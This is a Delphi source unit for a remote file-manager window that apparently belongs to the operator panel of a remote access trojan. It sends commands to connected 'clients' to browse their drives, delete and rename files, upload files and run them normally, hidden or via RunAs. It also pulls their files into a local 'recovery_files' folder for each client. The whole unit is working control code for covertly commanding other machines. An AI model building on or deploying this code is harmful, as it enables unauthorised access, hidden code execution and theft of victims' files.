unit UnitFileManager;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.ComCtrls, Vcl.ExtCtrls,
  Vcl.Menus, System.JSON, ncLines, System.UITypes, System.NetEncoding, System.IOUtils,
  Vcl.WinXCtrls;

const
  PACKET_TYPE_FILE_UPLOAD   = $04;
  PACKET_TYPE_FILE_DOWNLOAD = $05;

type
  TSendJSONProc = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
  TUnregisterFormProc = procedure(aLine: TncLine) of object;

  TForm9 = class(TForm)
    ListView1: TListView;
    Panel1: TPanel;
    StatusBar1: TStatusBar;
    Edit1: TEdit;
    Geri: TButton;
    Yenile: TButton;
    PopupMenu1: TPopupMenu;
    Delete1: TMenuItem;
    Delete2: TMenuItem;
    Download1: TMenuItem;
    NewFolder1: TMenuItem;
    Rename1: TMenuItem;
    Upload1: TMenuItem;
    Copy1: TMenuItem;
    Paste1: TMenuItem;
    Normal1: TMenuItem;
    Normal2: TMenuItem;
    RunAs1: TMenuItem;
    CheckBox1: TCheckBox;
    CheckBox2: TCheckBox;
    SearchBox1: TSearchBox;
    CheckBox3: TCheckBox;
    CheckBox4: TCheckBox;
    CheckBox5: TCheckBox;
    procedure Delete1Click(Sender: TObject);
    procedure Rename1Click(Sender: TObject);
    procedure Normal1Click(Sender: TObject);
    procedure Normal2Click(Sender: TObject);
    procedure RunAs1Click(Sender: TObject);
    procedure NewFolder1Click(Sender: TObject);
    procedure Download1Click(Sender: TObject);
    procedure Upload1Click(Sender: TObject);
    procedure Copy1Click(Sender: TObject);
    procedure Paste1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure GeriClick(Sender: TObject);
    procedure YenileClick(Sender: TObject);
    procedure ListView1DblClick(Sender: TObject);
    procedure Edit1KeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
    procedure CheckBox1Click(Sender: TObject);
    procedure CheckBox2Click(Sender: TObject);
    procedure CheckBox3Click(Sender: TObject);
    procedure CheckBox4Click(Sender: TObject);
    procedure CheckBox5Click(Sender: TObject);
    procedure SearchBox1Change(Sender: TObject);
  private
    FLine: TncLine;
    FClientID: string;
    FOnSendJSON: TSendJSONProc;
    FOnUnregister: TUnregisterFormProc;

    FCurrentPath: string;
    FLastStatus: string;
    FLastJSONFiles: TJSONArray;
    FUpdatingCheckBoxes: Boolean;

    procedure LogToStatus(const Msg: string);
    procedure ApplyLocalFilter;
    procedure Timer1Timer(Sender: TObject);
  public
    procedure SetupForClient(aLine: TncLine; const aClientID: string;
      aSendJSONProc: TSendJSONProc; aUnregisterProc: TUnregisterFormProc);
    procedure HandleFileManagerJSON(JSONObj: TJSONObject);
    procedure HandleBinaryPacket(PacketType: Byte; const Payload: TBytes);
    procedure DetachCallbacks;
    procedure RequestDrives;
    procedure RequestDirectory(const Path: string);
  end;

var
  Form9: TForm9;

implementation

{$R *.dfm}

type
  TncLineAccess = class(TncLine);

  TPacketHeader = packed record
    Signature  : Word;
    PacketType : Byte;
    Size       : Cardinal;
  end;

procedure TForm9.SetupForClient(aLine: TncLine; const aClientID: string;
  aSendJSONProc: TSendJSONProc; aUnregisterProc: TUnregisterFormProc);
begin
  FLine := aLine;
  FClientID := aClientID;
  FOnSendJSON := aSendJSONProc;
  FOnUnregister := aUnregisterProc;

  Caption := 'File Manager - ' + FClientID;
  FCurrentPath := '';
  Edit1.Text := '';
  ListView1.Items.Clear;
  FLastStatus := 'Folders [0] Files [0]';
  StatusBar1.SimpleText := FLastStatus;

  // Translation
  Geri.Caption := 'Back';
  // Menu Item Translations
  Delete1.Caption := 'Delete';
  Download1.Caption := 'Download';
  NewFolder1.Caption := 'New Folder';
  Rename1.Caption := 'Rename';
  Upload1.Caption := 'Upload';
  Copy1.Caption := 'Copy';
  Paste1.Caption := 'Paste';
  Normal1.Caption := 'Execute';
  Normal2.Caption := 'Execute (Hidden)';
  RunAs1.Caption := 'Execute (RunAs)';

  Yenile.Caption := 'Refresh';
  // ListView Column Translations
  ListView1.Columns[0].Caption := 'Name';
  ListView1.Columns[1].Caption := 'Date';
  ListView1.Columns[2].Caption := 'Type';
  ListView1.Columns[3].Caption := 'Size';


  OnClose := FormClose;
  Geri.OnClick := GeriClick;
  Yenile.OnClick := YenileClick;
  ListView1.OnDblClick := ListView1DblClick;
  Edit1.OnKeyDown := Edit1KeyDown;

  CheckBox1.Caption := 'List';
  CheckBox2.Caption := 'Grid';
  CheckBox3.Caption := 'All';
  CheckBox4.Caption := 'Dirs';
  CheckBox5.Caption := 'Files';

  FUpdatingCheckBoxes := True;
  try
    CheckBox1.Checked := True;
    CheckBox2.Checked := False;
    CheckBox3.Checked := True;
    CheckBox4.Checked := False;
    CheckBox5.Checked := False;
  finally
    FUpdatingCheckBoxes := False;
  end;

  ListView1.ViewStyle := vsReport;

  CheckBox1.OnClick := CheckBox1Click;
  CheckBox2.OnClick := CheckBox2Click;
  CheckBox3.OnClick := CheckBox3Click;
  CheckBox4.OnClick := CheckBox4Click;
  CheckBox5.OnClick := CheckBox5Click;
  SearchBox1.OnChange := SearchBox1Change;
end;

procedure TForm9.DetachCallbacks;
begin
  FLine := nil;
  FOnSendJSON := nil;
  FOnUnregister := nil;
end;

procedure TForm9.ApplyLocalFilter;
var
  i: Integer;
  ItemObj: TJSONObject;
  LItem: TListItem;
  FCount, DCount: Integer;
  SearchText: string;
  ShowDirs, ShowFiles: Boolean;
  ItemName, ItemType: string;
begin
  if not Assigned(FLastJSONFiles) then Exit;

  SearchText := Trim(SearchBox1.Text);
  ShowDirs := CheckBox3.Checked or CheckBox4.Checked;
  ShowFiles := CheckBox3.Checked or CheckBox5.Checked;

  ListView1.Items.BeginUpdate;
  try
    ListView1.Items.Clear;
    FCount := 0;
    DCount := 0;

    // First pass: Folders
    for i := 0 to FLastJSONFiles.Count - 1 do
    begin
      ItemObj := FLastJSONFiles.Items[i] as TJSONObject;
      ItemName := ItemObj.Values['name'].Value;
      ItemType := ItemObj.Values['type'].Value;

      if not SameText(ItemType, 'Folder') then Continue;
      if not ShowDirs then Continue;
      if (SearchText <> '') and (Pos(LowerCase(SearchText), LowerCase(ItemName)) <= 0) then Continue;

      LItem := ListView1.Items.Add;
      LItem.Caption := ItemName;
      LItem.SubItems.Add(ItemObj.Values['date'].Value);
      LItem.SubItems.Add(ItemType);
      LItem.SubItems.Add(ItemObj.Values['size'].Value);
      Inc(DCount);
    end;

    // Second pass: Files
    for i := 0 to FLastJSONFiles.Count - 1 do
    begin
      ItemObj := FLastJSONFiles.Items[i] as TJSONObject;
      ItemName := ItemObj.Values['name'].Value;
      ItemType := ItemObj.Values['type'].Value;

      if SameText(ItemType, 'Folder') then Continue;
      if not ShowFiles then Continue;
      if (SearchText <> '') and (Pos(LowerCase(SearchText), LowerCase(ItemName)) <= 0) then Continue;

      LItem := ListView1.Items.Add;
      LItem.Caption := ItemName;
      LItem.SubItems.Add(ItemObj.Values['date'].Value);
      LItem.SubItems.Add(ItemType);
      LItem.SubItems.Add(ItemObj.Values['size'].Value);
      Inc(FCount);
    end;
  finally
    ListView1.Items.EndUpdate;
  end;

  FLastStatus := Format('Folders [%d] Files [%d]', [DCount, FCount]);
  StatusBar1.SimpleText := FLastStatus;
end;

procedure TForm9.CheckBox1Click(Sender: TObject);
begin
  if FUpdatingCheckBoxes then Exit;
  FUpdatingCheckBoxes := True;
  try
    CheckBox1.Checked := True;
    CheckBox2.Checked := False;
    ListView1.ViewStyle := vsReport;
  finally
    FUpdatingCheckBoxes := False;
  end;
end;

procedure TForm9.CheckBox2Click(Sender: TObject);
begin
  if FUpdatingCheckBoxes then Exit;
  FUpdatingCheckBoxes := True;
  try
    CheckBox2.Checked := True;
    CheckBox1.Checked := False;
    ListView1.ViewStyle := vsIcon;
  finally
    FUpdatingCheckBoxes := False;
  end;
end;

procedure TForm9.CheckBox3Click(Sender: TObject);
begin
  if FUpdatingCheckBoxes then Exit;
  FUpdatingCheckBoxes := True;
  try
    CheckBox3.Checked := True;
    CheckBox4.Checked := False;
    CheckBox5.Checked := False;
  finally
    FUpdatingCheckBoxes := False;
  end;
  ApplyLocalFilter;
end;

procedure TForm9.CheckBox4Click(Sender: TObject);
begin
  if FUpdatingCheckBoxes then Exit;
  FUpdatingCheckBoxes := True;
  try
    CheckBox4.Checked := True;
    CheckBox3.Checked := False;
    CheckBox5.Checked := False;
  finally
    FUpdatingCheckBoxes := False;
  end;
  ApplyLocalFilter;
end;

procedure TForm9.CheckBox5Click(Sender: TObject);
begin
  if FUpdatingCheckBoxes then Exit;
  FUpdatingCheckBoxes := True;
  try
    CheckBox5.Checked := True;
    CheckBox3.Checked := False;
    CheckBox4.Checked := False;
  finally
    FUpdatingCheckBoxes := False;
  end;
  ApplyLocalFilter;
end;

procedure TForm9.SearchBox1Change(Sender: TObject);
begin
  ApplyLocalFilter;
end;

procedure TForm9.LogToStatus(const Msg: string);
begin
  // Thread-safe: her zaman main thread'de çalýþtýr
  if GetCurrentThreadId <> MainThreadID then
  begin
    TThread.Queue(nil,
      procedure
      begin
        LogToStatus(Msg);
      end);
    Exit;
  end;

  StatusBar1.SimpleText := Msg;

  TThread.CreateAnonymousThread(
    procedure
    begin
      Sleep(2000);
      TThread.Queue(nil,
        procedure
        begin
          if Assigned(StatusBar1) then
            StatusBar1.SimpleText := FLastStatus;
        end);
    end).Start;
end;

procedure TForm9.Timer1Timer(Sender: TObject);
begin
  // Placeholder for potential future timer logic
end;

procedure TForm9.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  if Assigned(FOnUnregister) and Assigned(FLine) then
    FOnUnregister(FLine);

  if Assigned(FLastJSONFiles) then
  begin
    FLastJSONFiles.Free;
    FLastJSONFiles := nil;
  end;

  Action := caFree;
end;

procedure TForm9.RequestDrives;
var
  JSONObj: TJSONObject;
begin
  if not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'getdrives');
    FOnSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.RequestDirectory(const Path: string);
var
  JSONObj: TJSONObject;
begin
  if not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'getfiles');
    JSONObj.AddPair('path', Path);
    FOnSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.HandleFileManagerJSON(JSONObj: TJSONObject);
var
  Action: string;
  Items: TJSONArray;
  i: Integer;
  ItemObj: TJSONObject;
  LItem: TListItem;
  FCount, DCount: Integer;
begin
  if not Assigned(JSONObj) then Exit;

  Action := '';
  if Assigned(JSONObj.Values['type']) then
    Action := JSONObj.Values['type'].Value;

  if SameText(Action, 'drives') then
  begin
    if Assigned(FLastJSONFiles) then
    begin
      FLastJSONFiles.Free;
      FLastJSONFiles := nil;
    end;
    Items := JSONObj.Values['drives'] as TJSONArray;
    ListView1.Items.BeginUpdate;
    try
      ListView1.Items.Clear;
      FCurrentPath := '';
      Edit1.Text := '';
      for i := 0 to Items.Count - 1 do
      begin
        LItem := ListView1.Items.Add;
        LItem.Caption := Items.Items[i].Value;
        LItem.SubItems.Add(''); // Date
        LItem.SubItems.Add('Drive');
        LItem.SubItems.Add(''); // Size
        LItem.ImageIndex := -1;
      end;
    finally
      ListView1.Items.EndUpdate;
    end;
    FLastStatus := 'Drives listed';
    StatusBar1.SimpleText := FLastStatus;
  end
  else if SameText(Action, 'files') then
  begin
    FCurrentPath := JSONObj.Values['path'].Value;
    Edit1.Text := FCurrentPath;
    Items := JSONObj.Values['files'] as TJSONArray;

    if Assigned(FLastJSONFiles) then FLastJSONFiles.Free;
    FLastJSONFiles := Items.Clone as TJSONArray;

    ApplyLocalFilter;
  end
  else if SameText(Action, 'log') then
  begin
  LogToStatus(JSONObj.Values['message'].Value);
  end
  else if SameText(Action, 'download') then
  begin
    // Legacy Base64 download handler - keeping for compatibility if needed,
    // but binary protocol is preferred now.
    var FileName := JSONObj.Values['name'].Value;
    var Base64Data := JSONObj.Values['data'].Value;
    var RawData: TBytes;
    var SavePath: string;

    RawData := TNetEncoding.Base64.Decode(TEncoding.UTF8.GetBytes(Base64Data));
    SavePath := TPath.Combine(ExtractFilePath(ParamStr(0)), 'Clients Folder');
    SavePath := TPath.Combine(SavePath, FClientID);
    SavePath := TPath.Combine(SavePath, 'recovery_files');

    if not TDirectory.Exists(SavePath) then
      TDirectory.CreateDirectory(SavePath);

    SavePath := TPath.Combine(SavePath, FileName);

    var MS := TMemoryStream.Create;
    try
      if Length(RawData) > 0 then
        MS.WriteBuffer(RawData[0], Length(RawData));
      MS.SaveToFile(SavePath);
    finally
      MS.Free;
    end;

    LogToStatus('Downloaded: ' + FileName);
  end;
end;

procedure TForm9.HandleBinaryPacket(PacketType: Byte; const Payload: TBytes);
begin
  if PacketType = PACKET_TYPE_FILE_DOWNLOAD then
  begin
    if Length(Payload) < 4 then Exit;

    var NameLen: Integer;
    Move(Payload[0], NameLen, 4);

    if (NameLen <= 0) or (NameLen > 2048) or (Length(Payload) < (4 + NameLen)) then Exit;

    var FileName: string;
    FileName := TEncoding.UTF8.GetString(Payload, 4, NameLen);

    // Sanitization: Prevent path traversal
    FileName := TPath.GetFileName(FileName);
    if FileName = '' then Exit;

    var FileDataLen := Length(Payload) - 4 - NameLen;
    var SavePath := TPath.Combine(ExtractFilePath(ParamStr(0)), 'Clients Folder');
    SavePath := TPath.Combine(SavePath, FClientID);
    SavePath := TPath.Combine(SavePath, 'recovery_files');

    if not TDirectory.Exists(SavePath) then
      TDirectory.CreateDirectory(SavePath);

    SavePath := TPath.Combine(SavePath, FileName);

    TThread.CreateAnonymousThread(
      procedure
      begin
        var MS := TMemoryStream.Create;
        try
          if FileDataLen > 0 then
            MS.WriteBuffer(Payload[4 + NameLen], FileDataLen);
          MS.SaveToFile(SavePath);
          TThread.Queue(nil,
            procedure
            begin
              LogToStatus('Downloaded (Binary): ' + FileName);
            end);
        finally
          MS.Free;
        end;
      end).Start;
  end;
end;

procedure TForm9.GeriClick(Sender: TObject);
var
  P: string;
begin
  if (FCurrentPath = '') or (Length(FCurrentPath) <= 3) then
  begin
    RequestDrives;
    Exit;
  end;

  P := ExcludeTrailingPathDelimiter(FCurrentPath);
  P := ExtractFilePath(P);

  if (P = '') or (Length(P) < 2) then
    RequestDrives
  else
    RequestDirectory(P);
end;

procedure TForm9.YenileClick(Sender: TObject);
begin
  LogToStatus('Refreshing...');   // <-- ekle
  if FCurrentPath = '' then
    RequestDrives
  else
    RequestDirectory(FCurrentPath);
end;

procedure TForm9.ListView1DblClick(Sender: TObject);
var
  LItem: TListItem;
  Name, FType: string;
begin
  LItem := ListView1.Selected;
  if not Assigned(LItem) then Exit;

  Name := LItem.Caption;
  FType := LItem.SubItems[1];

  if SameText(FType, 'Drive') then
    RequestDirectory(Name)
  else if SameText(FType, 'Folder') then
    RequestDirectory(IncludeTrailingPathDelimiter(FCurrentPath) + Name)
  else
  begin
    // It's a file, default action: Normal Execute
    Normal1Click(nil);
  end;
end;

procedure TForm9.Edit1KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if Key = VK_RETURN then
  begin
    if Trim(Edit1.Text) = '' then
      RequestDrives
    else
      RequestDirectory(Edit1.Text);
  end;
end;

procedure TForm9.Copy1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'copyfile');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Copied to clipboard');
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Delete1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  if MessageDlg('Are you sure you want to delete this?', mtConfirmation, [mbYes, mbNo], 0) <> mrYes then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'deletefile');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Deleting: ' + ListView1.Selected.Caption + '...');
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Download1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
  SizeStr: string;
  ValStr: string;
  Val: Double;
  FS: TFormatSettings;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;

  // Size check from ListView (Format: "1.23 MB")
  if ListView1.Selected.SubItems.Count >= 3 then
  begin
    SizeStr := ListView1.Selected.SubItems[2];
    if (Pos('GB', SizeStr) > 0) or (Pos('TB', SizeStr) > 0) then
    begin
      MessageBox(Handle, 'File size exceeds 50MB limit. Maximum 50MB allowed.', 'Download Error', MB_OK or MB_ICONERROR);
      Exit;
    end;
    if Pos('MB', SizeStr) > 0 then
    begin
      ValStr := Trim(Copy(SizeStr, 1, Pos('MB', SizeStr) - 1));
      FS := TFormatSettings.Create;
      FS.DecimalSeparator := '.';
      ValStr := StringReplace(ValStr, ',', '.', [rfReplaceAll]);
      if TryStrToFloat(ValStr, Val, FS) and (Val > 50.0) then
      begin
        MessageBox(Handle, 'File size exceeds 50MB limit. Maximum 50MB allowed.', 'Download Error', MB_OK or MB_ICONERROR);
        Exit;
      end;
    end;
  end;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'downloadfile');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Downloading: ' + ListView1.Selected.Caption + '...');
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.NewFolder1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
  FolderName: string;
begin
  if not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  FolderName := InputBox('New Folder', 'Enter folder name:', 'New Folder');
  if FolderName = '' then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'createfolder');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + FolderName);
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Creating folder...');
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Normal1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'execute');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    JSONObj.AddPair('mode', 'normal');
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Executing: ' + ListView1.Selected.Caption);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Normal2Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'execute');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    JSONObj.AddPair('mode', 'hidden');
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Executing (Hidden): ' + ListView1.Selected.Caption);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Paste1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'pastefile');
    JSONObj.AddPair('path', FCurrentPath);
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Pasting file...');
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Rename1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
  NewName: string;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  NewName := InputBox('Rename', 'Enter new name:', ListView1.Selected.Caption);
  if (NewName = '') or (NewName = ListView1.Selected.Caption) then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'rename');
    JSONObj.AddPair('oldpath', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    JSONObj.AddPair('newpath', IncludeTrailingPathDelimiter(FCurrentPath) + NewName);
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Renaming: ' + ListView1.Selected.Caption + '...');
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.RunAs1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'execute');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    JSONObj.AddPair('mode', 'runas');
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Executing (RunAs): ' + ListView1.Selected.Caption);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Upload1Click(Sender: TObject);
var
  OpenDlg: TOpenDialog;
  FileBytes: TBytes;
  FileName: string;
  DestPath: string;
  Payload: TBytes;
  NameBytes: TBytes;
  NameLen: Integer;
begin
  if not Assigned(FLine) then Exit;

  OpenDlg := TOpenDialog.Create(nil);
  try
    if OpenDlg.Execute then
    begin
      if TFile.GetSize(OpenDlg.FileName) > (50 * 1024 * 1024) then
      begin
        MessageBox(Handle, 'File size exceeds 50MB limit. Maximum 50MB allowed.', 'Upload Error', MB_OK or MB_ICONERROR);
        Exit;
      end;

      FileName := TPath.GetFileName(OpenDlg.FileName);
      DestPath := IncludeTrailingPathDelimiter(FCurrentPath) + FileName;

      FileBytes := TFile.ReadAllBytes(OpenDlg.FileName);
      NameBytes := TEncoding.UTF8.GetBytes(DestPath);
      NameLen   := Length(NameBytes);

      SetLength(Payload, 4 + NameLen + Length(FileBytes));
      Move(NameLen, Payload[0], 4);
      if NameLen > 0 then
        Move(NameBytes[0], Payload[4], NameLen);
      if Length(FileBytes) > 0 then
        Move(FileBytes[0], Payload[4 + NameLen], Length(FileBytes));

      TThread.CreateAnonymousThread(
        procedure
        var
          Header: TPacketHeader;
          SendBuf: TBytes;
          DataLen: Integer;
        begin
          DataLen := Length(Payload);
          Header.Signature := $524E; // 'NR'
          Header.PacketType := PACKET_TYPE_FILE_UPLOAD;
          Header.Size := Cardinal(DataLen);

          SetLength(SendBuf, SizeOf(TPacketHeader) + DataLen);
          Move(Header, SendBuf[0], SizeOf(TPacketHeader));
          if DataLen > 0 then
            Move(Payload[0], SendBuf[SizeOf(TPacketHeader)], DataLen);

          try
            TncLineAccess(FLine).SendBuffer(SendBuf[0], Length(SendBuf));
            TThread.Queue(nil,
              procedure
              begin
                if Assigned(StatusBar1) then
                  LogToStatus('Uploaded (Binary): ' + FileName);
              end);
          except
            on E: Exception do
              TThread.Queue(nil, procedure begin LogToStatus('Upload error: ' + E.Message); end);
          end;
        end).Start;
    end;
  finally
    OpenDlg.Free;
  end;
end;

end.




